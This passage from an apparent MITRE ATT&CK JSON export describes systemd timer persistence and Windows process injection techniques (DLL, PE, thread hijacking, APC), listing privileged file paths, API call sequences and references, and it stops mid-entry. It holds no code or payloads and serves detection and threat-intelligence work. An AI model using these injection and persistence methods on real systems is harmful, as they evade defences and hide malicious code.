    "technique_description": "<p>Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <!-- raw HTML omitted -->.timer<!-- raw HTML omitted --> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to <a href=\"https://attack.mitre.org/techniques/T1053/003\">Cron</a> in Linux environments.(Citation: archlinux Systemd Timers Aug 2020)<!-- raw HTML omitted --><!-- raw HTML omitted -->Each <!-- raw HTML omitted -->.timer<!-- raw HTML omitted --> file must have a corresponding <!-- raw HTML omitted -->.service<!-- raw HTML omitted --> file with the same name, e.g., <!-- raw HTML omitted -->example.timer<!-- raw HTML omitted --> and <!-- raw HTML omitted -->example.service<!-- raw HTML omitted -->. <!-- raw HTML omitted -->.service<!-- raw HTML omitted --> files are <a href=\"https://attack.mitre.org/techniques/T1543/002\">Systemd Service</a> unit files that are managed by the systemd system and service manager.(Citation: Linux man-pages: systemd January 2014) Privileged timers are written to <!-- raw HTML omitted -->/etc/systemd/system/<!-- raw HTML omitted --> and <!-- raw HTML omitted -->/usr/lib/systemd/system<!-- raw HTML omitted --> while user level are written to <!-- raw HTML omitted -->~/.config/systemd/user/<!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.</p>\n",
    "technique_references": [
      {
        "source_name": "archlinux Systemd Timers Aug 2020",
        "url": "https://wiki.archlinux.org/index.php/Systemd/Timers",
        "description": "archlinux. (2020, August 11). systemd/Timers. Retrieved October 12, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Linux man-pages: systemd January 2014",
        "url": "http://man7.org/linux/man-pages/man1/systemd.1.html",
        "description": "Linux man-pages. (2014, January). systemd(1) - Linux manual page. Retrieved April 23, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018",
        "url": "https://www.bleepingcomputer.com/news/security/malware-found-in-arch-linux-aur-package-repository/",
        "description": "Catalin Cimpanu. (2018, July 10). Malware Found in Arch Linux AUR Package Repository. Retrieved April 23, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "gist Arch package compromise 10JUL2018",
        "url": "https://gist.github.com/campuscodi/74d0d2e35d8fd9499c76333ce027345a",
        "description": "Catalin Cimpanu. (2018, July 10). ~x file downloaded in public Arch package compromise. Retrieved April 23, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "acroread package compromised Arch Linux Mail 8JUL2018",
        "url": "https://lists.archlinux.org/pipermail/aur-general/2018-July/034153.html",
        "description": "Eli Schwartz. (2018, June 8). acroread package compromised. Retrieved April 23, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--a542bac9-7bc1-4da7-9a09-96f69e23cc21",
    "platform": "linux",
    "tid": "T1053.006",
    "technique": "Systemd Timers",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <!-- raw HTML omitted -->.timer<!-- raw HTML omitted --> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to <a href=\"https://attack.mitre.org/techniques/T1053/003\">Cron</a> in Linux environments.(Citation: archlinux Systemd Timers Aug 2020)<!-- raw HTML omitted --><!-- raw HTML omitted -->Each <!-- raw HTML omitted -->.timer<!-- raw HTML omitted --> file must have a corresponding <!-- raw HTML omitted -->.service<!-- raw HTML omitted --> file with the same name, e.g., <!-- raw HTML omitted -->example.timer<!-- raw HTML omitted --> and <!-- raw HTML omitted -->example.service<!-- raw HTML omitted -->. <!-- raw HTML omitted -->.service<!-- raw HTML omitted --> files are <a href=\"https://attack.mitre.org/techniques/T1543/002\">Systemd Service</a> unit files that are managed by the systemd system and service manager.(Citation: Linux man-pages: systemd January 2014) Privileged timers are written to <!-- raw HTML omitted -->/etc/systemd/system/<!-- raw HTML omitted --> and <!-- raw HTML omitted -->/usr/lib/systemd/system<!-- raw HTML omitted --> while user level are written to <!-- raw HTML omitted -->~/.config/systemd/user/<!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.</p>\n",
    "technique_references": [
      {
        "source_name": "archlinux Systemd Timers Aug 2020",
        "url": "https://wiki.archlinux.org/index.php/Systemd/Timers",
        "description": "archlinux. (2020, August 11). systemd/Timers. Retrieved October 12, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Linux man-pages: systemd January 2014",
        "url": "http://man7.org/linux/man-pages/man1/systemd.1.html",
        "description": "Linux man-pages. (2014, January). systemd(1) - Linux manual page. Retrieved April 23, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018",
        "url": "https://www.bleepingcomputer.com/news/security/malware-found-in-arch-linux-aur-package-repository/",
        "description": "Catalin Cimpanu. (2018, July 10). Malware Found in Arch Linux AUR Package Repository. Retrieved April 23, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "gist Arch package compromise 10JUL2018",
        "url": "https://gist.github.com/campuscodi/74d0d2e35d8fd9499c76333ce027345a",
        "description": "Catalin Cimpanu. (2018, July 10). ~x file downloaded in public Arch package compromise. Retrieved April 23, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "acroread package compromised Arch Linux Mail 8JUL2018",
        "url": "https://lists.archlinux.org/pipermail/aur-general/2018-July/034153.html",
        "description": "Eli Schwartz. (2018, June 8). acroread package compromised. Retrieved April 23, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--a542bac9-7bc1-4da7-9a09-96f69e23cc21",
    "platform": "linux",
    "tid": "T1053.006",
    "technique": "Systemd Timers",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <!-- raw HTML omitted -->.timer<!-- raw HTML omitted --> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to <a href=\"https://attack.mitre.org/techniques/T1053/003\">Cron</a> in Linux environments.(Citation: archlinux Systemd Timers Aug 2020)<!-- raw HTML omitted --><!-- raw HTML omitted -->Each <!-- raw HTML omitted -->.timer<!-- raw HTML omitted --> file must have a corresponding <!-- raw HTML omitted -->.service<!-- raw HTML omitted --> file with the same name, e.g., <!-- raw HTML omitted -->example.timer<!-- raw HTML omitted --> and <!-- raw HTML omitted -->example.service<!-- raw HTML omitted -->. <!-- raw HTML omitted -->.service<!-- raw HTML omitted --> files are <a href=\"https://attack.mitre.org/techniques/T1543/002\">Systemd Service</a> unit files that are managed by the systemd system and service manager.(Citation: Linux man-pages: systemd January 2014) Privileged timers are written to <!-- raw HTML omitted -->/etc/systemd/system/<!-- raw HTML omitted --> and <!-- raw HTML omitted -->/usr/lib/systemd/system<!-- raw HTML omitted --> while user level are written to <!-- raw HTML omitted -->~/.config/systemd/user/<!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.</p>\n",
    "technique_references": [
      {
        "source_name": "archlinux Systemd Timers Aug 2020",
        "url": "https://wiki.archlinux.org/index.php/Systemd/Timers",
        "description": "archlinux. (2020, August 11). systemd/Timers. Retrieved October 12, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Linux man-pages: systemd January 2014",
        "url": "http://man7.org/linux/man-pages/man1/systemd.1.html",
        "description": "Linux man-pages. (2014, January). systemd(1) - Linux manual page. Retrieved April 23, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018",
        "url": "https://www.bleepingcomputer.com/news/security/malware-found-in-arch-linux-aur-package-repository/",
        "description": "Catalin Cimpanu. (2018, July 10). Malware Found in Arch Linux AUR Package Repository. Retrieved April 23, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "gist Arch package compromise 10JUL2018",
        "url": "https://gist.github.com/campuscodi/74d0d2e35d8fd9499c76333ce027345a",
        "description": "Catalin Cimpanu. (2018, July 10). ~x file downloaded in public Arch package compromise. Retrieved April 23, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "acroread package compromised Arch Linux Mail 8JUL2018",
        "url": "https://lists.archlinux.org/pipermail/aur-general/2018-July/034153.html",
        "description": "Eli Schwartz. (2018, June 8). acroread package compromised. Retrieved April 23, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945",
    "platform": "windows",
    "tid": "T1055.001",
    "technique": "Dynamic-link Library Injection",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|dll-monitoring|file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  <!-- raw HTML omitted --><!-- raw HTML omitted -->DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <!-- raw HTML omitted -->VirtualAllocEx<!-- raw HTML omitted --> and <!-- raw HTML omitted -->WriteProcessMemory<!-- raw HTML omitted -->, then invoked with <!-- raw HTML omitted -->CreateRemoteThread<!-- raw HTML omitted --> (which calls the <!-- raw HTML omitted -->LoadLibrary<!-- raw HTML omitted --> API responsible for loading the DLL). (Citation: Endgame Process Injection July 2017) <!-- raw HTML omitted --><!-- raw HTML omitted -->Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <!-- raw HTML omitted -->LoadLibrary<!-- raw HTML omitted -->).(Citation: Endgame HuntingNMemory June 2017)(Citation: Endgame Process Injection July 2017) <!-- raw HTML omitted --><!-- raw HTML omitted -->Running code in the context of another process may allow access to the process’s memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Endgame HuntingNMemory June 2017",
        "url": "https://www.endgame.com/blog/technical-blog/hunting-memory",
        "description": "Desimone, J. (2017, June 13). Hunting in Memory. Retrieved December 7, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945",
    "platform": "windows",
    "tid": "T1055.001",
    "technique": "Dynamic-link Library Injection",
    "tactic": "privilege-escalation",
    "datasources": "api-monitoring|dll-monitoring|file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  <!-- raw HTML omitted --><!-- raw HTML omitted -->DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <!-- raw HTML omitted -->VirtualAllocEx<!-- raw HTML omitted --> and <!-- raw HTML omitted -->WriteProcessMemory<!-- raw HTML omitted -->, then invoked with <!-- raw HTML omitted -->CreateRemoteThread<!-- raw HTML omitted --> (which calls the <!-- raw HTML omitted -->LoadLibrary<!-- raw HTML omitted --> API responsible for loading the DLL). (Citation: Endgame Process Injection July 2017) <!-- raw HTML omitted --><!-- raw HTML omitted -->Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <!-- raw HTML omitted -->LoadLibrary<!-- raw HTML omitted -->).(Citation: Endgame HuntingNMemory June 2017)(Citation: Endgame Process Injection July 2017) <!-- raw HTML omitted --><!-- raw HTML omitted -->Running code in the context of another process may allow access to the process’s memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Endgame HuntingNMemory June 2017",
        "url": "https://www.endgame.com/blog/technical-blog/hunting-memory",
        "description": "Desimone, J. (2017, June 13). Hunting in Memory. Retrieved December 7, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--806a49c4-970d-43f9-9acc-ac0ee11e6662",
    "platform": "windows",
    "tid": "T1055.002",
    "technique": "Portable Executable Injection",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. <!-- raw HTML omitted --><!-- raw HTML omitted -->PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <!-- raw HTML omitted -->VirtualAllocEx<!-- raw HTML omitted --> and <!-- raw HTML omitted -->WriteProcessMemory<!-- raw HTML omitted -->, then invoked with <!-- raw HTML omitted -->CreateRemoteThread<!-- raw HTML omitted --> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. (Citation: Endgame Process Injection July 2017) <!-- raw HTML omitted --><!-- raw HTML omitted -->Running code in the context of another process may allow access to the process’s memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--806a49c4-970d-43f9-9acc-ac0ee11e6662",
    "platform": "windows",
    "tid": "T1055.002",
    "technique": "Portable Executable Injection",
    "tactic": "privilege-escalation",
    "datasources": "api-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. <!-- raw HTML omitted --><!-- raw HTML omitted -->PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <!-- raw HTML omitted -->VirtualAllocEx<!-- raw HTML omitted --> and <!-- raw HTML omitted -->WriteProcessMemory<!-- raw HTML omitted -->, then invoked with <!-- raw HTML omitted -->CreateRemoteThread<!-- raw HTML omitted --> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. (Citation: Endgame Process Injection July 2017) <!-- raw HTML omitted --><!-- raw HTML omitted -->Running code in the context of another process may allow access to the process’s memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--41d9846c-f6af-4302-a654-24bba2729bc6",
    "platform": "windows",
    "tid": "T1055.003",
    "technique": "Thread Execution Hijacking",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. <!-- raw HTML omitted --><!-- raw HTML omitted -->Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <!-- raw HTML omitted -->OpenThread<!-- raw HTML omitted -->. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <!-- raw HTML omitted -->SuspendThread <!-- raw HTML omitted -->, <!-- raw HTML omitted -->VirtualAllocEx<!-- raw HTML omitted -->, <!-- raw HTML omitted -->WriteProcessMemory<!-- raw HTML omitted -->, <!-- raw HTML omitted -->SetThreadContext<!-- raw HTML omitted -->, then <!-- raw HTML omitted -->ResumeThread<!-- raw HTML omitted --> respectively.(Citation: Endgame Process Injection July 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->This is very similar to <a href=\"https://attack.mitre.org/techniques/T1055/012\">Process Hollowing</a> but targets an existing process rather than creating a process in a suspended state.  <!-- raw HTML omitted --><!-- raw HTML omitted -->Running code in the context of another process may allow access to the process’s memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--41d9846c-f6af-4302-a654-24bba2729bc6",
    "platform": "windows",
    "tid": "T1055.003",
    "technique": "Thread Execution Hijacking",
    "tactic": "privilege-escalation",
    "datasources": "api-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. <!-- raw HTML omitted --><!-- raw HTML omitted -->Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <!-- raw HTML omitted -->OpenThread<!-- raw HTML omitted -->. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <!-- raw HTML omitted -->SuspendThread <!-- raw HTML omitted -->, <!-- raw HTML omitted -->VirtualAllocEx<!-- raw HTML omitted -->, <!-- raw HTML omitted -->WriteProcessMemory<!-- raw HTML omitted -->, <!-- raw HTML omitted -->SetThreadContext<!-- raw HTML omitted -->, then <!-- raw HTML omitted -->ResumeThread<!-- raw HTML omitted --> respectively.(Citation: Endgame Process Injection July 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->This is very similar to <a href=\"https://attack.mitre.org/techniques/T1055/012\">Process Hollowing</a> but targets an existing process rather than creating a process in a suspended state.  <!-- raw HTML omitted --><!-- raw HTML omitted -->Running code in the context of another process may allow access to the process’s memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--7c0f17c9-1af6-4628-9cbd-9e45482dd605",
    "platform": "windows",
    "tid": "T1055.004",
    "technique": "Asynchronous Procedure Call",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. <!-- raw HTML omitted --><!-- raw HTML omitted -->APC injection is commonly performed by attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process’s thread. Queued APC functions are executed when the thread enters an alterable state.(Citation: Microsoft APC) A handle to an existing victim process is first created with native Windows API calls such as <!-- raw HTML omitted -->OpenThread<!-- raw HTML omitted -->. At this point <!-- raw HTML omitted -->QueueUserAPC<!-- raw HTML omitted --> can be used to invoke a function (such as <!-- raw HTML omitted -->LoadLibrayA<!-- raw HTML omitted --> pointing to a malicious DLL). <!-- raw HTML omitted --><!-- raw HTML omitted -->A variation of APC injection, dubbed “Early Bird injection”, involves creating a suspended process in which malicious code can be written and executed before the process’ entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018) AtomBombing (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.(Citation: Microsoft Atom Table)<!-- raw HTML omitted --><!-- raw HTML omitted -->Running code in the context of another process may allow access to the process’s memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft APC",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms681951.aspx",
        "description": "Microsoft. (n.d.). Asynchronous Procedure Calls. Retrieved December 8, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "CyberBit Early Bird Apr 2018",
        "url": "https://www.cyberbit.com/blog/endpoint-security/new-early-bird-code-injection-technique-discovered/",
        "description": "Gavriel, H. & Erbesfeld, B. (2018, April 11). New ‘Early Bird’ Code Injection Technique Discovered. Retrieved May 24, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "ENSIL AtomBombing Oct 2016",
        "url": "https://blog.ensilo.com/atombombing-brand-new-code-injection-for-windows",
        "description": "Liberman, T. (2016, October 27). ATOMBOMBING: BRAND NEW CODE INJECTION FOR WINDOWS. Retrieved December 8, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Atom Table",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms649053.aspx",
        "description": "Microsoft. (n.d.). About Atom Tables. Retrieved December 8, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--7c0f17c9-1af6-4628-9cbd-9e45482dd605",
    "platform": "windows",
    "tid": "T1055.004",
    "technique": "Asynchronous Procedure Call",
    "tactic": "privilege-escalation",
    "datasources": "api-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. <!-- raw HTML omitted --><!-- raw HTML omitted -->APC injection is commonly performed by attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process’s thread. Queued APC functions are executed when the thread enters an alterable state.(Citation: Microsoft APC) A handle to an existing victim process is first created with native Windows API calls such as <!-- raw HTML omitted -->OpenThread<!-- raw HTML omitted -->. At this point <!-- raw HTML omitted -->QueueUserAPC<!-- raw HTML omitted --> can be used to invoke a function (such as <!-- raw HTML omitted -->LoadLibrayA<!-- raw HTML omitted --> pointing to a malicious DLL). <!-- raw HTML omitted --><!-- raw HTML omitted -->A variation of APC injection, dubbed “Early Bird injection”, involves creating a suspended process in which malicious code can be written and executed before the process’ entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018) AtomBombing (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.(Citation: Microsoft Atom Table)<!-- raw HTML omitted --><!-- raw HTML omitted -->Running code in the context of another process may allow access to the process’s memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft APC",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms681951.aspx",
        "description": "Microsoft. (n.d.). Asynchronous Procedure Calls. Retrieved December 8, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "CyberBit Early Bird Apr 2018",
        "url": "https://www.cyberbit.com/blog/endpoint-security/new-early-bird-code-injection-technique-discovered/",
        "description": "Gavriel, H. & Erbesfeld, B. (2018, April 11). New ‘Early Bird’ Code Injection Technique Discovered. Retrieved May 24, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "ENSIL AtomBombing Oct 2016",
        "url": "https://blog.ensilo.com/atombombing-brand-new-code-injection-for-windows",
        "description": "Liberman, T. (2016, October 27). ATOMBOMBING: BRAND NEW CODE INJECTION FOR WINDOWS. Retrieved December 8, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Atom Table",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms649053.aspx",
        "description": "Microsoft. (n.d.). About Atom Tables. Retrieved December 8, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--e49ee9d2-0d98-44ef-85e5-5d3100065744",
    "platform": "windows",
    "tid": "T1055.005",
    "technique": "Thread Local Storage",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
